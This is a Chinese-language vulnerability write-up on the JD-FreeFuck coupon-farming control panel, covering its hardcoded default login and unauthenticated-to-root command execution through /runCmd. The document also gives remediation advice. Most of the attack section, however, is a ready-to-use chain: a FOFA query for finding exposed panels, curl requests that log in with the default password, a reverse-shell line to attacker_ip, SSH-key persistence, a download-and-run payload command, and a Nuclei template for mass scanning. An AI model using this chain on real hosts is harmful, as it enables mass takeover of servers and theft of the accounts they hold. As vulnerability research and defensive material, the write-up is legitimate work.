---
title: JD-FreeFuck 京东薅羊毛控制面板后台默认口令与命令执行漏洞分析
description: 深度分析 JD-FreeFuck 京东薅羊毛控制面板存在的后台默认弱口令（admin/supermanito）及 /runCmd 接口任意命令执行漏洞，包含漏洞原理、利用链条、FOFA
  搜索语法及实战复现细节。
category: ai-security
tags:
- JD-FreeFuck
- 京东薅羊毛
- 默认口令
- RCE
- 命令执行
- runCmd
- 未授权访问
- 漏洞复现
date: '2023-04-14'
updated: '2026-11-12'
---

## 概述

**JD-FreeFuck**（项目地址：`https://github.com/meselson/JD-FreeFuck`）是一款开源的京东“薅羊毛”自动化控制面板，用于批量管理京东账号、执行签到、领券等脚本任务。该面板在早期版本中存在两个严重安全缺陷：

1.  **后台默认弱口令**：预置 `admin` / `supermanito` 账号密码，且大量部署未修改默认凭证。
2.  **`/runCmd` 接口任意命令执行**：登录后台后，通过 `/runCmd` 接口直接执行系统命令，无任何过滤与鉴权。

攻击者可组合利用这两个缺陷，实现**从未授权访问到服务器完全沦陷**的完整攻击链。

## 资产测绘与指纹识别

### FOFA 搜索语法

```text
title="京东薅羊毛控制面板"
```

### 特征页面

- 登录页标题：`京东薅羊毛控制面板`
- 登录表单提交地址：`/login`
- 后台主页路径：`/index` 或 `/`

## 漏洞详情

### 后台默认弱口令

| 用户名 | 密码 | 备注 |
| :--- | :--- | :--- |
| `admin` | `supermanito` | 项目文档/代码中硬编码的默认凭证 |

**影响**：大量使用者直接部署默认配置，未修改初始口令，导致攻击者可直接登录后台。

### `/runCmd` 接口任意命令执行 (RCE)

**漏洞端点**：`POST /runCmd`

**请求参数**：

| 参数名 | 类型 | 说明 |
| :--- | :--- | :--- |
| `cmd` | string | 待执行的系统命令（如 `cat /etc/passwd`） |
| `delay` | integer | 可选，命令执行延迟（毫秒），默认 500 |

**漏洞成因**：后端代码直接将用户提交的 `cmd` 参数拼接进 `exec` / `child_process.exec` 等危险函数执行，未做任何输入校验、命令拼接过滤或权限最小化处理。

## 实战利用链

### 步骤 1：弱口令登录获取 Cookie

```bash
curl -X POST "http://target/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=admin&password=supermanito" \
  -c cookie.jar
```

成功后保存返回的 `connect.sid` 等会话 Cookie。

### 步骤 2：携带 Cookie 调用 `/runCmd` 执行命令

```bash
curl -X POST "http://target/runCmd" \
  -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" \
  -H "X-Requested-With: XMLHttpRequest" \
  -b cookie.jar \
  -d "cmd=cat /etc/passwd&delay=500"
```

**响应示例**：

```json
{
  "code": 200,
  "data": "root:x:0:0:root:/root:/bin/bash\n..."
}
```

### 步骤 3：反弹 Shell / 持久化

```bash
# 反弹 Bash Shell (Linux)
cmd=bash -c 'bash -i >& /dev/tcp/attacker_ip/4444 0>&1'

# 写入 SSH 公钥
cmd=echo "ssh-rsa AAAA..." >> /root/.ssh/authorized_keys

# 下载并执行恶意脚本
cmd=wget http://attacker_ip/payload.sh -O /tmp/payload.sh && bash /tmp/payload.sh
```

## 批量检测与自动化利用

### Nuclei 模板示例

```yaml
id: jd-freefuck-default-login-rce
info:
  name: JD-FreeFuck Default Login & RCE
  author: curated
  severity: critical
  tags: jd-freefuck, rce, default-login
http:
  - raw:
      - |
        POST /login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        username=admin&password=supermanito
    matchers:
      - type: word
        part: header
        words:
          - "connect.sid="
  - raw:
      - |
        POST /runCmd HTTP/1.1
        Host: {{Hostname}}
        Cookie: {{cookie}}
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
        X-Requested-With: XMLHttpRequest
        cmd=id&delay=500
    matchers:
      - type: regex
        regex:
          - "uid=\\d+\\(.*\\)"
```

## 修复与缓解建议

1.  **修改默认口令**：部署即修改 `config/auth.json` 或环境变量中的 `ADMIN_USER` / `ADMIN_PASS`。
2.  **禁用或严格限制 `/runCmd`**：
    - 生产环境建议直接删除该路由代码。
    - 若必须保留，需实施：命令白名单、参数化执行、最小权限用户运行、审计日志记录。
3.  **网络层访问控制**：
    - 面板绑定 `127.0.0.1` + SSH 隧道/VPN 访问，禁止直接暴露公网。
    - 防火墙/安全组仅允许受信 IP 访问管理端口。
4.  **升级/迁移**：关注上游仓库是否已修复，或迁移至维护更活跃、安全设计更完善的替代方案（如 `JD-Scripts` Docker 编排方案）。

## 关联知识与交叉引用

- [[secquan-bugwarning-1071987-device-credential-leak]] — 同类“设备/面板凭证泄露导致未授权后台访问”漏洞模式分析，提供 FOFA 语法与影响评估方法论。
- [[spring-boot-actuator配置不当rce利用]] — Spring Boot Actuator 暴露 `/env`、`/restart` 结合 H2 Console JNDI 注入实现 RCE，展示“功能性接口未授权/弱授权 + 危险操作”通用利用模式。
- [[h2-console-jndi注入rce利用]] — H2 Database Console 未授权访问 + JNDI 注入 RCE，同属“管理控制台默认开放/弱口令 + 高危功能”攻击面。
- [[docker-container-security-fundamentals]] — 容器化部署 JD-FreeFuck 时的隔离与加固参考（Namespace、Capability、Seccomp、只读根文件系统）。

## 时间线

| 日期 | 事件 |
| :--- | :--- |
| 2023-04-14 | 微信公众号文章发布，披露默认口令与 `/runCmd` RCE 细节 |
| 2023-04-14 | 安全圈（secquan.org）同步讨论编号 1071932 |
| 2023-04-14+ | 社区开始批量扫描、利用，建议立即自查修复 |

## 参考资料

1.  原文：`http://mp.weixin.qq.com/s?__biz=MzU5MjMzODY0NQ==&mid=2247484292&idx=2&sn=37a396d74cd5119ed91a451f23993260`
2.  项目仓库：`https://github.com/meselson/JD-FreeFuck`
3.  安全圈讨论：`https://www.secquan.org/Discuss/1071932`

## 来源

- [0th3rs安全团队-201911-202204_046](../sources/0th3rs安全团队-201911-202204_046.md)
